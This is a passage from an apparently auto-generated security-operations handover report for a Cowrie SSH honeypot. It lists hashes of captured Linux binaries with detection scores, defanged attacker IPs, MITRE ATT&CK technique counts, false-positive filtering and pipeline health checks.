| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `39.107.96[.]168` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 11 |
| `3.130.168[.]2` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `103.167.95[.]242` | IN | Cybercity | **100** ⚠️ | 5 |
| `27.123.102[.]122` | IN | Bharti Airtel Limited | **100** ⚠️ | 25 |
| `59.120.8[.]61` | TW | Data Communication Business Group, | **100** ⚠️ | 16 |
| `118.179.102[.]248` | BD | Amber IT Limited | **100** ⚠️ | 50 |
| `101.13.4[.]128` | TW | Taiwan Mobile Co., Ltd. | **100** ⚠️ | 29 |
| `34.71.111[.]34` | US | Google LLC | **100** ⚠️ | 0 |
| `61.23.36[.]232` | JP | JCOM Co., Ltd. | **100** ⚠️ | 31 |
| `180.153.91[.]15` | CN | CHINANET SHANGHAI PROVINCE NETWORK | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 112 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 87 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 11 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 4 |

---

## 🔕 False Positive Summary (23 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 19 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 19 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 132 cases |
| Tool 34  | Credential Extractor        | ✅ 98 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 64 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 23 filtered (17.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 53 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 11 priority case(s) shown individually · 43 recon entry/entries in table (16 group(s) consolidating 71 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-26T05:40:59Z_
